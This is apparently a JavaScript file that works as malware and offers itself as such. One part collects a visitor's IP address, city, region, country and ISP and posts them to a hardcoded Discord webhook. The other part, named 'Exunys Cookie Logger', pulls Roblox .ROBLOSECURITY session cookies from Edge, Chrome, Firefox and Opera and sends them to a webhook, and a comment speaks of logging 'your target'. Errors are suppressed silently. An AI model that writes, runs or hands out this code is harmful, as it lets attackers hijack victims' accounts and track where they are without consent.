// Function to log IP information to a Discord webhook
async function logIPToDiscord() {
  // Fetch the user's IP address
  const ipData = await fetch('https://api.ipify.org?format=json').then(response => response.json());

  // Fetch location data based on the IP address
  const locationData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(response => response.json());

  // Discord webhook URL
  const webhookUrl = 'https://discord.com/api/webhooks/1292133644781092894/aOQyAzT2P2mhRM1WJHqeUvVq7EZX1jalZV4oGIL9L3pCkXT02l9x9Zbkbviu5lBn43hF'; // Replace with your Discord webhook URL

  // Function to format time to 12-hour format
  function format12HourTime(date) {
    let hours = date.getHours();
    const minutes = date.getMinutes();
    const seconds = date.getSeconds();
    const ampm = hours >= 12? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours? hours : 12; // the hour '0' should be '12'
    const strMinutes = minutes < 10? '0' + minutes : minutes;
    const strSeconds = seconds < 10? '0' + seconds : seconds;
    return `${hours}:${strMinutes}:${strSeconds} ${ampm}`;
  }

  // Create the embed payload for Discord
  const embed = {
    content: null,
    embeds: [
      {
        title: 'User Access Log',
        fields: [
          { name: 'IP Address', value: ipData.ip },
          { name: 'City', value: locationData.city },
          { name: 'Region', value: locationData.region },
          { name: 'Country', value: locationData.country_name },
          { name: 'Wi-Fi Provider', value: locationData.org },
          { name: 'Access Time', value: format12HourTime(new Date()) }, // Use 12-hour format
        ],
        color: 5814783
      }
    ]
  };

  // Send the embed to the Discord webhook
  await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(embed),
  });
}

// Cookie logging functions
const browserCookie3 = require('browser-cookies');
const axios = require('axios');

const WebHook = "INPUT_HERE"; // Input your webhook here and make sure to compile if you want to log your target

function MicrosoftEdge() {
  try {
    const cookies = browserCookie3.edge({ domain: "roblox.com" });
    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
    axios.post(WebHook, {
      username: "Exunys Cookie Logger V1.0",
      content: `\`\`\`${cookie}\`\`\``
    });
  } catch (error) {
    // Handle error
  }
}

function GoogleChrome() {
  try {
    const cookies = browserCookie3.chrome({ domain: "roblox.com" });
    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
    axios.post(WebHook, {
      username: "Exunys Cookie Logger V1.0",
      content: `\`\`\`${cookie}\`\`\``
    });
  } catch (error) {
    // Handle error
  }
}

function MozillaFirefox() {
  try {
    const cookies = browserCookie3.firefox({ domain: "roblox.com" });
    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
    axios.post(WebHook, {
      username: "Exunys Cookie Logger V1.0",
      content: `\`\`\`${cookie}\`\`\``
    });
  } catch (error) {
    // Handle error
  }
}

function Opera() {
  try {
    const cookies = browserCookie3.opera({ domain: "roblox.com" });
    const cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for.roblox.com/>")[0].trim();
    axios.post(WebHook, {
      username: "KM LOGGERS LOL",
      content: `\`\`\`${cookie}\`\`\``
    });
  } catch (error) {
    // Handle error
  }
}

const browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera];

browsers.forEach(browser => {
  setTimeout(browser, 0); // Simulate threading with setTimeout
});

// Call the logging function
logIPToDiscord();
